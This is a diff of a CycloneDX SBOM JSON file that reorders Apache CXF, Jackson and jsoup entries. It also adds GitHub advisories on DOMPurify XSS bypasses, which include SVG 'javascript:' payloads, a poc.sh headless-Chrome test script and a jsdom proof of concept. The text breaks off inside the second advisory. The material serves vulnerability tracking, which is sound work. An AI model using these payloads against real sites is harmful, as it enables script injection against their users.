@@ -1,10 +1,10 @@
 {
   "bomFormat": "CycloneDX",
   "specVersion": "1.5",
-  "serialNumber": "urn:uuid:37fc10fe-7b50-4324-9580-d1c55ba447bf",
+  "serialNumber": "urn:uuid:01937759-f8fe-421b-85c3-e0deef7d0500",
   "version": 1,
   "metadata": {
-    "timestamp": "2026-10-22T16:32:47Z",
+    "timestamp": "2026-10-23T17:20:33Z",
     "tools": {
       "components": [
         {
@@ -559,6 +559,56 @@
     },
     {
       "type": "library",
+      "bom-ref": "273d459b-263c-4830-b89e-d492a4e1d325",
+      "group": "org.apache.cxf",
+      "name": "cxf-core",
+      "version": "4.2.0",
+      "scope": "required",
+      "hashes": [
+        {
+          "alg": "MD5",
+          "content": "ad4c38fe965d17612b4899491dbfc166"
+        },
+        {
+          "alg": "SHA-1",
+          "content": "b3aa43960c734f662269c57c0ae9de12f2b7c4c4"
+        },
+        {
+          "alg": "SHA-256",
+          "content": "f514f302ea0d8c91b8931df276dccb8acb4614c770eec7eca60b3d9a7aa62f98"
+        },
+        {
+          "alg": "SHA-384",
+          "content": "725c99266c3df97d2794677b83ff0b9173319df7a0f4a520d8ad80f52884bdde1678eb4f056968939d1f1d0ac13ccf47"
+        },
+        {
+          "alg": "SHA-512",
+          "content": "9e6332eed53cb2d25cb19ef7bb723c11d75dd62f7619629838295abe2b95a2bfcc423f372276ff90dba5da3ef0c0779a32828250ffddac5fdf3986a0ee129317"
+        },
+        {
+          "alg": "SHA3-256",
+          "content": "b7ca6cb0f552d96a5d948db64aa50c01e29ac8ea3d00ba41e0e17c95a4eb9aa6"
+        },
+        {
+          "alg": "SHA3-512",
+          "content": "552198b399f93423316c5c57c109a2ea58b199d6638754bcec73707c993666def0974dcd97e8180f48cc8a7fd3d71a7046d73c24cf4cbbe4096279efd1537a4e"
+        },
+        {
+          "alg": "SHA3-384",
+          "content": "d88bd8055481f0054ac63f3126af76c0fc900b6dad603d0a0ee8ce0ab0117a8c85a23d73ae96aae5672d6298e59e5ff2"
+        }
+      ],
+      "cpe": "cpe:2.3:a:apache:cxf:4.2.0:*:*:*:*:*:*:*",
+      "purl": "pkg:maven/org.apache.cxf/cxf-core@4.2.0?type=bundle",
+      "externalReferences": [
+        {
+          "type": "website",
+          "url": "https://cxf.apache.org"
+        }
+      ]
+    },
+    {
+      "type": "library",
       "bom-ref": "5a031e13-4138-4bed-b6bd-8df2c6c65fa4",
       "group": "org.apache.cxf",
       "name": "cxf-core",
@@ -621,56 +671,6 @@
         {
           "type": "vcs",
           "url": "https://gitbox.apache.org/repos/asf?p=cxf.git/cxf-parent/cxf-core"
-        }
-      ]
-    },
-    {
-      "type": "library",
-      "bom-ref": "273d459b-263c-4830-b89e-d492a4e1d325",
-      "group": "org.apache.cxf",
-      "name": "cxf-core",
-      "version": "4.2.0",
-      "scope": "required",
-      "hashes": [
-        {
-          "alg": "MD5",
-          "content": "ad4c38fe965d17612b4899491dbfc166"
-        },
-        {
-          "alg": "SHA-1",
-          "content": "b3aa43960c734f662269c57c0ae9de12f2b7c4c4"
-        },
-        {
-          "alg": "SHA-256",
-          "content": "f514f302ea0d8c91b8931df276dccb8acb4614c770eec7eca60b3d9a7aa62f98"
-        },
-        {
-          "alg": "SHA-384",
-          "content": "725c99266c3df97d2794677b83ff0b9173319df7a0f4a520d8ad80f52884bdde1678eb4f056968939d1f1d0ac13ccf47"
-        },
-        {
-          "alg": "SHA-512",
-          "content": "9e6332eed53cb2d25cb19ef7bb723c11d75dd62f7619629838295abe2b95a2bfcc423f372276ff90dba5da3ef0c0779a32828250ffddac5fdf3986a0ee129317"
-        },
-        {
-          "alg": "SHA3-256",
-          "content": "b7ca6cb0f552d96a5d948db64aa50c01e29ac8ea3d00ba41e0e17c95a4eb9aa6"
-        },
-        {
-          "alg": "SHA3-512",
-          "content": "552198b399f93423316c5c57c109a2ea58b199d6638754bcec73707c993666def0974dcd97e8180f48cc8a7fd3d71a7046d73c24cf4cbbe4096279efd1537a4e"
-        },
-        {
-          "alg": "SHA3-384",
-          "content": "d88bd8055481f0054ac63f3126af76c0fc900b6dad603d0a0ee8ce0ab0117a8c85a23d73ae96aae5672d6298e59e5ff2"
-        }
-      ],
-      "cpe": "cpe:2.3:a:apache:cxf:4.2.0:*:*:*:*:*:*:*",
-      "purl": "pkg:maven/org.apache.cxf/cxf-core@4.2.0?type=bundle",
-      "externalReferences": [
-        {
-          "type": "website",
-          "url": "https://cxf.apache.org"
         }
       ]
     },
@@ -845,63 +845,6 @@
     },
     {
       "type": "library",
-      "bom-ref": "328de2a2-5ca7-4802-9443-f6425c795533",
-      "group": "com.fasterxml.jackson.core",
-      "name": "jackson-core",
-      "version": "2.21.1",
-      "scope": "required",
-      "hashes": [
-        {
-          "alg": "MD5",
-          "content": "a526a530a07fd25140dee4695e686051"
-        },
-        {
-          "alg": "SHA-1",
-          "content": "47b013fc85dbb819f3ba51e95a5560d0f1c4121c"
-        },
-        {
-          "alg": "SHA-256",
-          "content": "1edd5f2e49dca5f8e4519957c24b7b3050bd1c7ee883920da33cff031ff1f7c0"
-        },
-        {
-          "alg": "SHA-384",
-          "content": "22047a20191a34eba9c83e3b6d5df5b74b160eea9c5279e3d32d7688e2dcdd791083db1d661ebb7aaf872fe603460f30"
-        },
-        {
-          "alg": "SHA-512",
-          "content": "f4b153a0a7c974620dec3fcfe4a4869c2632ab97f73c2662041af7d0eb0c42ad462bfee8cdcab5542842175b96197df1d910a8841067654f6e763b370c18ccfa"
-        },
-        {
-          "alg": "SHA3-256",
-          "content": "a39b1a208b640982042b4ad6f7606a7b6ea537d23034fafd7d3330252e85c178"
-        },
-        {
-          "alg": "SHA3-512",
-          "content": "a712ad471cd591149a8d9e8d2ad1795915d1098332d521c32be26e76ea9b18eb84d22d3dd1dd3f008bfb223b89d7a6c33cd621385933735f67d758cb191be9ca"
-        },
-        {
-          "alg": "SHA3-384",
-          "content": "44632cb6d9783d4dd883081507ff220c19bd620041791e8f1e63671aa57400d2bc03af732a9a12728b5918e4e7a415e2"
-        }
-      ],
-      "licenses": [
-        {
-          "license": {
-            "id": "Apache-2.0",
-            "url": "https://www.apache.org/licenses/LICENSE-2.0.txt"
-          }
-        }
-      ],
-      "purl": "pkg:maven/com.fasterxml.jackson.core/jackson-core@2.21.1",
-      "externalReferences": [
-        {
-          "type": "website",
-          "url": "https://github.com/FasterXML/jackson-core"
-        }
-      ]
-    },
-    {
-      "type": "library",
       "bom-ref": "07ce5977-89e1-49aa-a638-3a0aad750408",
       "group": "com.fasterxml.jackson.core",
       "name": "jackson-core",
@@ -961,6 +904,63 @@
         },
         {
           "type": "vcs",
+          "url": "https://github.com/FasterXML/jackson-core"
+        }
+      ]
+    },
+    {
+      "type": "library",
+      "bom-ref": "328de2a2-5ca7-4802-9443-f6425c795533",
+      "group": "com.fasterxml.jackson.core",
+      "name": "jackson-core",
+      "version": "2.21.1",
+      "scope": "required",
+      "hashes": [
+        {
+          "alg": "MD5",
+          "content": "a526a530a07fd25140dee4695e686051"
+        },
+        {
+          "alg": "SHA-1",
+          "content": "47b013fc85dbb819f3ba51e95a5560d0f1c4121c"
+        },
+        {
+          "alg": "SHA-256",
+          "content": "1edd5f2e49dca5f8e4519957c24b7b3050bd1c7ee883920da33cff031ff1f7c0"
+        },
+        {
+          "alg": "SHA-384",
+          "content": "22047a20191a34eba9c83e3b6d5df5b74b160eea9c5279e3d32d7688e2dcdd791083db1d661ebb7aaf872fe603460f30"
+        },
+        {
+          "alg": "SHA-512",
+          "content": "f4b153a0a7c974620dec3fcfe4a4869c2632ab97f73c2662041af7d0eb0c42ad462bfee8cdcab5542842175b96197df1d910a8841067654f6e763b370c18ccfa"
+        },
+        {
+          "alg": "SHA3-256",
+          "content": "a39b1a208b640982042b4ad6f7606a7b6ea537d23034fafd7d3330252e85c178"
+        },
+        {
+          "alg": "SHA3-512",
+          "content": "a712ad471cd591149a8d9e8d2ad1795915d1098332d521c32be26e76ea9b18eb84d22d3dd1dd3f008bfb223b89d7a6c33cd621385933735f67d758cb191be9ca"
+        },
+        {
+          "alg": "SHA3-384",
+          "content": "44632cb6d9783d4dd883081507ff220c19bd620041791e8f1e63671aa57400d2bc03af732a9a12728b5918e4e7a415e2"
+        }
+      ],
+      "licenses": [
+        {
+          "license": {
+            "id": "Apache-2.0",
+            "url": "https://www.apache.org/licenses/LICENSE-2.0.txt"
+          }
+        }
+      ],
+      "purl": "pkg:maven/com.fasterxml.jackson.core/jackson-core@2.21.1",
+      "externalReferences": [
+        {
+          "type": "website",
           "url": "https://github.com/FasterXML/jackson-core"
         }
       ]
@@ -1293,6 +1293,63 @@
     },
     {
       "type": "library",
+      "bom-ref": "60b81f44-bb03-400d-9e5b-7f38bc251552",
+      "group": "org.jsoup",
+      "name": "jsoup",
+      "version": "1.15.4",
+      "scope": "required",
+      "hashes": [
+        {
+          "alg": "MD5",
+          "content": "642bc7d013d5c950fbdf90d9bfffc246"
+        },
+        {
+          "alg": "SHA-1",
+          "content": "cd56eb47dcd4590ef6451f87e5ec33bddd1a9a51"
+        },
+        {
+          "alg": "SHA-256",
+          "content": "006830d0797710408de5589c18d864343c0ef1a3a0c603c9cb138c943b67d9a4"
+        },
+        {
+          "alg": "SHA-384",
+          "content": "fa81a6f2bd9e26b224cc646789e277e24cf2a2cbd28f8d1ca1c3c3c4ef902c30d1382bfb4740de32214cd23c5bb92898"
+        },
+        {
+          "alg": "SHA-512",
+          "content": "bd36ea804bd42c89c2fef8dae5dec1e4bb81c339d5994fbfbc6b9bed547ad258ae130d723659aa5ffffe7ed9d0957cc022df67ab56ab13385ee621b03d51569e"
+        },
+        {
+          "alg": "SHA3-256",
+          "content": "026debe59b49c73968281c2f4097919a0c0d9cd7308ab957953bcbf12514af2a"
+        },
+        {
+          "alg": "SHA3-512",
+          "content": "968e86134f47cb93258b51bf599e7e44f18436c57b2eb7146c298e7c27867f366ea9f7f6b0c37ab201720b4bee8ed88fd702a8363201e91811a951c1c95afa10"
+        },
+        {
+          "alg": "SHA3-384",
+          "content": "1f45d1fd18e44051320a55bbdfb754170fd4d38d4f950a441ab7a76bd5a58a5c6172729d384f42922bd6542a96c521b9"
+        }
+      ],
+      "licenses": [
+        {
+          "license": {
+            "name": "The MIT License",
+            "url": "https://jsoup.org/license"
+          }
+        }
+      ],
+      "purl": "pkg:maven/org.jsoup/jsoup@1.15.4",
+      "externalReferences": [
+        {
+          "type": "website",
+          "url": "https://jsoup.org/"
+        }
+      ]
+    },
+    {
+      "type": "library",
       "bom-ref": "c53f34bb-0d74-4720-bc9f-5f1a55fcd34d",
       "group": "org.jsoup",
       "name": "jsoup",
@@ -1353,63 +1410,6 @@
         {
           "type": "vcs",
           "url": "https://github.com/jhy/jsoup"
-        }
-      ]
-    },
-    {
-      "type": "library",
-      "bom-ref": "60b81f44-bb03-400d-9e5b-7f38bc251552",
-      "group": "org.jsoup",
-      "name": "jsoup",
-      "version": "1.15.4",
-      "scope": "required",
-      "hashes": [
-        {
-          "alg": "MD5",
-          "content": "642bc7d013d5c950fbdf90d9bfffc246"
-        },
-        {
-          "alg": "SHA-1",
-          "content": "cd56eb47dcd4590ef6451f87e5ec33bddd1a9a51"
-        },
-        {
-          "alg": "SHA-256",
-          "content": "006830d0797710408de5589c18d864343c0ef1a3a0c603c9cb138c943b67d9a4"
-        },
-        {
-          "alg": "SHA-384",
-          "content": "fa81a6f2bd9e26b224cc646789e277e24cf2a2cbd28f8d1ca1c3c3c4ef902c30d1382bfb4740de32214cd23c5bb92898"
-        },
-        {
-          "alg": "SHA-512",
-          "content": "bd36ea804bd42c89c2fef8dae5dec1e4bb81c339d5994fbfbc6b9bed547ad258ae130d723659aa5ffffe7ed9d0957cc022df67ab56ab13385ee621b03d51569e"
-        },
-        {
-          "alg": "SHA3-256",
-          "content": "026debe59b49c73968281c2f4097919a0c0d9cd7308ab957953bcbf12514af2a"
-        },
-        {
-          "alg": "SHA3-512",
-          "content": "968e86134f47cb93258b51bf599e7e44f18436c57b2eb7146c298e7c27867f366ea9f7f6b0c37ab201720b4bee8ed88fd702a8363201e91811a951c1c95afa10"
-        },
-        {
-          "alg": "SHA3-384",
-          "content": "1f45d1fd18e44051320a55bbdfb754170fd4d38d4f950a441ab7a76bd5a58a5c6172729d384f42922bd6542a96c521b9"
-        }
-      ],
-      "licenses": [
-        {
-          "license": {
-            "name": "The MIT License",
-            "url": "https://jsoup.org/license"
-          }
-        }
-      ],
-      "purl": "pkg:maven/org.jsoup/jsoup@1.15.4",
-      "externalReferences": [
-        {
-          "type": "website",
-          "url": "https://jsoup.org/"
         }
       ]
     },
@@ -2980,15 +2980,15 @@
       ]
     },
     {
-      "ref": "5a031e13-4138-4bed-b6bd-8df2c6c65fa4",
-      "dependsOn": [
-        "ba4e1c2d-865f-405e-be1f-88474462dc0c"
-      ]
-    },
-    {
       "ref": "273d459b-263c-4830-b89e-d492a4e1d325",
       "dependsOn": [
         "73aedc46-d67d-4973-be2b-55debba53854"
+      ]
+    },
+    {
+      "ref": "5a031e13-4138-4bed-b6bd-8df2c6c65fa4",
+      "dependsOn": [
+        "ba4e1c2d-865f-405e-be1f-88474462dc0c"
       ]
     },
     {
@@ -3004,11 +3004,11 @@
       "dependsOn": []
     },
     {
-      "ref": "328de2a2-5ca7-4802-9443-f6425c795533",
+      "ref": "07ce5977-89e1-49aa-a638-3a0aad750408",
       "dependsOn": []
     },
     {
-      "ref": "07ce5977-89e1-49aa-a638-3a0aad750408",
+      "ref": "328de2a2-5ca7-4802-9443-f6425c795533",
       "dependsOn": []
     },
     {
@@ -3046,11 +3046,11 @@
       "dependsOn": []
     },
     {
-      "ref": "c53f34bb-0d74-4720-bc9f-5f1a55fcd34d",
+      "ref": "60b81f44-bb03-400d-9e5b-7f38bc251552",
       "dependsOn": []
     },
     {
-      "ref": "60b81f44-bb03-400d-9e5b-7f38bc251552",
+      "ref": "c53f34bb-0d74-4720-bc9f-5f1a55fcd34d",
       "dependsOn": []
     },
     {
@@ -10063,6 +10063,74 @@
         "state": "not_affected",
         "justification": "code_not_present",
         "detail": "Affects a transitive dependency that is non-exploitable in this case."
+      },
+      "affects": [
+        {
+          "ref": "de23bb9e-8f8e-4166-985d-60eaa6122e02"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-c6gr-qvv4-5v3f",
+      "source": {
+        "name": "GITHUB",
+        "url": "https://github.com/advisories"
+      },
+      "ratings": [
+        {
+          "source": {
+            "name": "GITHUB",
+            "url": "https://github.com/advisories"
+          },
+          "severity": "low",
+          "method": "other"
+        }
+      ],
+      "cwes": [
+        79
+      ],
+      "description": "### Summary\n\nDOMPurify drops `attributeName` attributes whose value contains `href`, so an allowed `<animate>` or `<set>` can't rewrite a link's href after sanitizing. The check compares the attribute name after `transformCaseFunc`, and that function doesn't lowercase in XHTML mode. In XHTML the attribute is spelled `attributeName`, so the comparison with `\"attributename\"` never matches and the guard does nothing.\n\nAn app that uses `PARSER_MEDIA_TYPE: 'application/xhtml+xml'` and allows `animate` and `attributeName` will keep `<animate attributeName=\"href\" values=\"x;javascript:alert(1)\">`. Clicking the parent link then runs the script.\n\nThis needs a non-default config, so going by SECURITY.md, this is a hardening bug rather than a bypass of the default config.\n\n### Details\n\nIn `_sanitizeAttributes` (dist/purify.js line 2216 in 3.4.16):\n\n```js\nconst lcName = transformCaseFunc(name);\n...\nif (lcName === \"attributename\" && stringMatch(value, \"href\")) {\n  _removeAttribute(name, currentNode, attr);\n  continue;\n}\n```\n\n`transformCaseFunc` is `stringToLowerCase` for text/html but the identity function for application/xhtml+xml, because XML names are case-sensitive. The XML parser keeps SVG's real name `attributeName`, so in XHTML mode `lcName` is `attributeName` and the branch never runs.\n\nPeople using XHTML mode have to list SVG attributes in camelCase. The built-in attribute lists are lowercase and won't match, so `ALLOWED_ATTR`/`ADD_ATTR: ['attributeName', ...]` is the config you'd naturally write here.\n\nThe value also passes the URI check. `IS_ALLOWED_URI` only checks the start of the string, and `x;javascript:alert(1)` looks like a relative value. SMIL reads `values` as a `;` list and, with `fill=\"freeze\"`, the last entry ends up as the effective href of the parent `<a>`.\n\nIn text/html mode the same allowlist is handled correctly. The name is lowercased and `attributeName` is removed.\n\nThis is close to the XHTML case-sensitivity hardening in 3.4.14/3.4.15 (Attack Classes & Bypass History §22): a check written for lowercase names that a case-preserved name gets past.\n\n### Proof of concept\n\nTested with DOMPurify 3.4.16 in Chrome 153 (headless shell). Also reproduced on 3.3.3, 3.3.1 and 3.2.7. Not confirmed for 2.x.\n\nConfig:\n\n```js\nconst cfg = {\n  PARSER_MEDIA_TYPE: 'application/xhtml+xml',\n  ALLOWED_TAGS: ['svg', 'a', 'animate', 'text'],\n  ALLOWED_ATTR: ['attributeName', 'values', 'dur', 'fill', 'x', 'y', 'font-size', 'id', 'width', 'height'],\n};\n```\n\n`{ PARSER_MEDIA_TYPE: 'application/xhtml+xml', USE_PROFILES: { svg: true }, ADD_TAGS: ['animate'], ADD_ATTR: ['attributeName'] }` behaves the same.\n\nInput:\n\n```html\n<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"200\" height=\"60\"><a id=\"q\"><animate attributeName=\"href\" values=\"x;javascript:alert(1)\" dur=\"0.01s\" fill=\"freeze\"/><text x=\"10\" y=\"40\" font-size=\"30\">click</text></a></svg>\n```\n\nSteps:\n\n1. Save this as `poc.xhtml` next to `purify.js` (3.4.16) and open it in Chrome. The `.xhtml` extension makes Chrome load it as application/xhtml+xml, so nothing moves between HTML and XHTML.\n\n```html\n<html xmlns=\"http://www.w3.org/1999/xhtml\"><head><title>poc</title>\n<script src=\"purify.js\"></script></head><body><div id=\"sink\"></div>\n<script>//<![CDATA[\nconst cfg = {\n  PARSER_MEDIA_TYPE: 'application/xhtml+xml',\n  ALLOWED_TAGS: ['svg', 'a', 'animate', 'text'],\n  ALLOWED_ATTR: ['attributeName', 'values', 'dur', 'fill', 'x', 'y', 'font-size', 'id', 'width', 'height'],\n};\nconst dirty = '<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"200\" height=\"60\"><a id=\"q\"><animate attributeName=\"href\" values=\"x;javascript:alert(1)\" dur=\"0.01s\" fill=\"freeze\"/><text x=\"10\" y=\"40\" font-size=\"30\">click</text></a></svg>';\nconst clean = DOMPurify.sanitize(dirty, cfg);\nconsole.log(clean);\ndocument.getElementById('sink').innerHTML = clean;\n//]]></script></body></html>\n```\n\n2. The logged output still contains `attributeName=\"href\"` and `values=\"x;javascript:alert(1)\"`.\n3. `document.getElementById('q').href.animVal` returns `\"javascript:alert(1)\"`.\n4. Click \"click\" and `alert(1)` runs.\n\nAs a control, remove `PARSER_MEDIA_TYPE` and change the allowlist entry to `attributename`. The output then loses `attributeName`, `href.animVal` is `\"\"`, and clicking does nothing. The same XHTML-mode output also runs when inserted into a normal text/html page.\n\nAn automated version (fetches a given version from npm, clicks via CDP, checks for the dialog, runs the control) is below.\n\n<details>\n<summary>poc.sh</summary>\n\n```bash\n#!/usr/bin/env bash\n# PoC: DOMPurify SMIL attributeName=href guard bypass in XHTML parser mode.\n#\n# Sanitizes an SVG payload with a PARSER_MEDIA_TYPE:\"application/xhtml+xml\"\n# config that allow-lists <animate> + attributeName, renders the output into\n# div.innerHTML in headless Chromium, clicks the link with a trusted (CDP) mouse\n# event and reports whether alert() fired. Also runs the same allowlist in\n# text/html mode as a control (DOMPurify strips attributeName there).\n#\n# usage:  ./poc.sh [dompurify-version]          (default 3.4.16, fetched via `npm pack`)\n#         DOMPURIFY_JS=/path/to/purify.js ./poc.sh\n#         CHROME=/path/to/chrome ./poc.sh\n# needs:  node >= 18, npm (unless DOMPURIFY_JS is set), a Chromium/Chrome binary.\n# exit:   0 = vulnerable (alert fired in xhtml mode), 1 = not vulnerable, 2 = setup error\nset -euo pipefail\nVER=\"${1:-3.4.16}\"\nWORK=\"$(mktemp -d)\"\ntrap 'rm -rf \"$WORK\"' EXIT\n\nif [ -z \"${DOMPURIFY_JS:-}\" ]; then\n  (cd \"$WORK\" && npm pack \"dompurify@$VER\" --silent >/dev/null 2>&1 && tar xzf dompurify-*.tgz) || { echo \"npm pack dompurify@$VER failed\" >&2; exit 2; }\n  DOMPURIFY_JS=\"$WORK/package/dist/purify.js\"\nfi\nif [ -z \"${CHROME:-}\" ]; then\n  for c in \"$HOME\"/.cache/ms-playwright/chromium_headless_shell-*/chrome-headless-shell-linux64/chrome-headless-shell \\\n           \"$HOME\"/.cache/ms-playwright/chromium-*/chrome-linux/chrome \\\n           \"$(command -v google-chrome || true)\" \"$(command -v chromium || true)\" \"$(command -v chromium-browser || true)\"; do\n    [ -n \"$c\" ] && [ -x \"$c\" ] && CHROME=\"$c\" && break\n  done\nfi\n[ -n \"${CHROME:-}\" ] || { echo \"no Chrome/Chromium found; set CHROME=\" >&2; exit 2; }\n\ncat > \"$WORK/poc.html\" <<'EOF'\n<!doctype html><meta charset=\"utf-8\"><title>poc</title>\n<script src=\"purify.js\"></script>\n<div id=\"sink\"></div>\n<script>//<![CDATA[\nconst payload = '<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"200\" height=\"60\">' +\n  '<a id=\"q\"><animate attributeName=\"href\" values=\"x;javascript:alert(1)\" dur=\"0.01s\" fill=\"freeze\"/>' +\n  '<text x=\"10\" y=\"40\" font-size=\"30\">click</text></a></svg>';\nfunction run(mode) {\n  const cfg = {\n    ALLOWED_TAGS: ['svg', 'a', 'animate', 'text'],\n    ALLOWED_ATTR: [mode === 'xhtml' ? 'attributeName' : 'attributename', 'values', 'dur', 'fill', 'x', 'y', 'font-size', 'id', 'width', 'height'],\n  };\n  if (mode === 'xhtml') cfg.PARSER_MEDIA_TYPE = 'application/xhtml+xml';\n  const clean = DOMPurify.sanitize(payload, cfg);\n  document.getElementById('sink').innerHTML = clean;\n  return clean;\n}\n//]]></script>\nEOF\ncp \"$DOMPURIFY_JS\" \"$WORK/purify.js\"\n# Same test inside a real XHTML document (no HTML<->XHTML context flip):\n# the page is parsed as application/xhtml+xml and the sink's innerHTML uses the XML fragment parser.\nsed -e 's#<!doctype html><meta charset=\"utf-8\"><title>poc</title>#<html xmlns=\"http://www.w3.org/1999/xhtml\"><head><title>poc</title>#' \\\n    -e 's#<script src=\"purify.js\"></script>#<script src=\"purify.js\"></script></head><body>#' \\\n    -e 's#^</script>$#</script></body></html>#' \"$WORK/poc.html\" > \"$WORK/poc.xhtml\"\n\ncat > \"$WORK/drive.js\" <<'EOF'\n// zero-dependency CDP driver over --remote-debugging-pipe\nconst { spawn } = require('child_process');\nconst [chrome, url, dir] = process.argv.slice(2);\nconst xurl = url.replace(/\\.html$/, '.xhtml');\nconst p = spawn(chrome, ['--headless', '--no-sandbox', '--remote-debugging-pipe', '--disable-gpu', '--no-first-run',\n  `--user-data-dir=${dir}/profile`, 'about:blank'], { stdio: ['ignore', 'ignore', 'ignore', 'pipe', 'pipe'] });\nlet id = 0, buf = ''; const pend = new Map(), dialogs = [];\np.stdio[4].on('data', (d) => {\n  buf += d; let i;\n  while ((i = buf.indexOf('\\0')) >= 0) {\n    const m = JSON.parse(buf.slice(0, i)); buf = buf.slice(i + 1);\n    if (m.id && pend.has(m.id)) { pend.get(m.id)(m); pend.delete(m.id); }\n    else if (m.method === 'Page.javascriptDialogOpening') {\n      dialogs.push(m.params.message);\n      send('Page.handleJavaScriptDialog', { accept: true }, m.sessionId);\n    }\n  }\n});\nfunction send(method, params = {}, sessionId) {\n  return new Promise((r) => { const n = ++id; pend.set(n, r); p.stdio[3].write(JSON.stringify({ id: n, method, params, sessionId }) + '\\0'); });\n}\nconst sleep = (ms) => new Promise((r) => setTimeout(r, ms));\n(async () => {\n  const { result: { targetId } } = await send('Target.createTarget', { url: 'about:blank' });\n  const { result: { sessionId: s } } = await send('Target.attachToTarget', { targetId, flatten: true });\n  await send('Page.enable', {}, s); await send('Runtime.enable', {}, s);\n  const ev = async (e) => (await send('Runtime.evaluate', { expression: e, returnByValue: true, awaitPromise: true }, s)).result.result.value;\n  let vulnerable = false, xhtmlDoc = false;\n  const ver = async () => ev('DOMPurify.version');\n  for (const [mode, page] of [['html', url], ['xhtml', url], ['xhtml', xurl]]) {\n    await send('Page.navigate', { url: page }, s); await sleep(500);\n    const docType = await ev('document.contentType');\n    if (mode === 'html') console.log('DOMPurify', await ver(), '/', await ev('navigator.userAgent.match(/Chrome\\\\/[\\\\d.]+/)[0]'));\n    dialogs.length = 0;\n    const clean = await ev(`run(${JSON.stringify(mode)})`);\n    await sleep(400); // let the 0.01s animation apply (fill=freeze)\n    const href = await ev(`(()=>{const a=document.getElementById('q');return a?a.href.animVal:null})()`);\n    const box = await ev(`(()=>{const t=document.querySelector('#sink text');if(!t)return null;const r=t.getBoundingClientRect();return [r.x+r.width/2,r.y+r.height/2]})()`);\n    if (box) for (const type of ['mouseMoved', 'mousePressed', 'mouseReleased'])\n      await send('Input.dispatchMouseEvent', { type, x: box[0], y: box[1], button: 'left', clickCount: 1 }, s);\n    await sleep(800);\n    console.log(`\\n[${mode} mode, sink document ${docType}] sanitized output:\\n  ${clean}`);\n    console.log(`  animated <a> href (animVal): ${JSON.stringify(href)}`);\n    console.log(`  alert() fired on click: ${dialogs.length ? 'YES ' + JSON.stringify(dialogs) : 'no'}`);\n    if (mode === 'xhtml' && dialogs.length) vulnerable = true;\n    if (mode === 'xhtml' && docType === 'application/xhtml+xml') xhtmlDoc = dialogs.length > 0;\n  }\n  console.log(vulnerable ? `\\nRESULT: VULNERABLE (javascript: executed in XHTML mode; pure-XHTML document sink: ${xhtmlDoc ? 'also executes' : 'no'})` : '\\nRESULT: not vulnerable');\n  p.kill('SIGKILL'); process.exit(vulnerable ? 0 : 1);\n})().catch((e) => { console.error(e); p.kill('SIGKILL'); process.exit(2); });\nEOF\nnode \"$WORK/drive.js\" \"$CHROME\" \"file://$WORK/poc.html\" \"$WORK\"\n```\n\n</details>\n\n### Impact\n\nStored or reflected XSS on a click. It affects apps that sanitize SVG in XHTML mode and allow `animate` (or `set`) with `attributeName`, for example to keep simple SVG animations. Script runs in the app's origin when a user clicks the sanitized link. Default configs and text/html mode aren't affected.",
+      "published": "2026-10-22T16:24:23Z",
+      "updated": "2026-10-22T16:24:24Z",
+      "analysis": {
+        "state": "not_affected",
+        "justification": "code_not_reachable",
+        "detail": "Non-applicable. This relates to a transitive dependency used only when rendering markdown files which however are only defined internally."
+      },
+      "affects": [
+        {
+          "ref": "de23bb9e-8f8e-4166-985d-60eaa6122e02"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-mrv2-3pqr-j5jr",
+      "source": {
+        "name": "GITHUB",
+        "url": "https://github.com/advisories"
+      },
+      "ratings": [
+        {
+          "source": {
+            "name": "GITHUB",
+            "url": "https://github.com/advisories"
+          },
+          "score": 7.6,
+          "severity": "high",
+          "vector": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N"
+        }
+      ],
+      "cwes": [
+        79,
+        693
+      ],
+      "description": "### Summary\n\nThe 3.4.16 fix for GHSA-p98j-92pf-mc4p only covers a hook that removes the node it was called for. If an `IN_PLACE` hook removes a different node, like the current node's parent or a sibling that has not been visited yet, that subtree is never walked or neutralized. Event handlers in it stay on the elements, and an `<img onerror>` that was already loading fires after `sanitize()` returns.\n\nThe README says: \"Nodes that a hook detaches from the tree ... are treated as removed. In IN_PLACE mode their subtree is neutralized inline, so an `<img onload>` that was already loading when you built the live tree cannot fire after `sanitize()` returns.\" That does not hold when the detached node is not the hook's own node.\n\n### Tested versions\n\n- 3.4.16 (latest) and main at 18f8f0e\n- also 3.4.15, 3.4.12 and 2.5.8\n\njsdom for the matrix below, and Chromium (Playwright) for the event actually firing.\n\n### Details\n\n`src/purify.ts` line 2134 (`dist/purify.cjs.js` line 2009 in 3.4.16), `_handleHookDetachedNode()`:\n\n```js\nif (currentNode === root || getParentNode(currentNode) !== null) {\n  return false;\n}\nif (IN_PLACE) {\n  _neutralizeSubtree(currentNode);\n}\n```\n\nIt only checks whether `currentNode` lost its parent. When a hook removes `currentNode.parentNode` (or any ancestor), `currentNode` still has a parent, so nothing happens. The rest of the removed subtree is no longer reachable by the walker, and it is not in `DOMPurify.removed`, so the post walk pass does not see it either. The same happens when a hook removes a later sibling. This applies to all five element and attribute hooks.\n\n### PoC (jsdom)\n\n```js\nconst { JSDOM } = require('jsdom')\nconst createDOMPurify = require('dompurify')\nconst win = new JSDOM('<!doctype html><body></body>').window\nconst doc = win.document\n\nfor (const mode of ['self', 'parent', 'nextSibling']) {\n  const DOMPurify = createDOMPurify(win)\n  doc.body.innerHTML = '<div id=root><figure><img class=bad src=a.png>' +\n    '<img id=evil src=x onerror=alert(1)></figure><p>ok</p></div>'\n  const root = doc.getElementById('root')\n  const evil = doc.getElementById('evil')\n\n  // app hook: drop a bad image (self), its wrapper (parent), or the next element (nextSibling)\n  DOMPurify.addHook('afterSanitizeAttributes', (node) => {\n    if (node.getAttribute && node.getAttribute('class') === 'bad') {\n      if (mode === 'self') node.remove()\n      if (mode === 'parent') node.parentNode.remove()\n      if (mode === 'nextSibling') node.nextElementSibling.remove()\n    }\n  })\n\n  DOMPurify.sanitize(root, { IN_PLACE: true })\n  console.log(DOMPurify.version, mode.padEnd(11), 'onerror =', JSON.stringify(evil.getAttribute('onerror')))\n}\n```\n\nOutput on 3.4.16:\n\n```\n3.4.16 self        onerror = null\n3.4.16 parent      onerror = \"alert(1)\"\n3.4.16 nextSibling onerror = \"alert(1)\"\n```\n\nIn `self` mode the walker still reaches the second image and strips `onerror`. In the other two modes the second image is detached with its handler still set. The same result is achieved with each of `beforeSanitizeElements`, `uponSanitizeElement`, `afterSanitizeElements`, 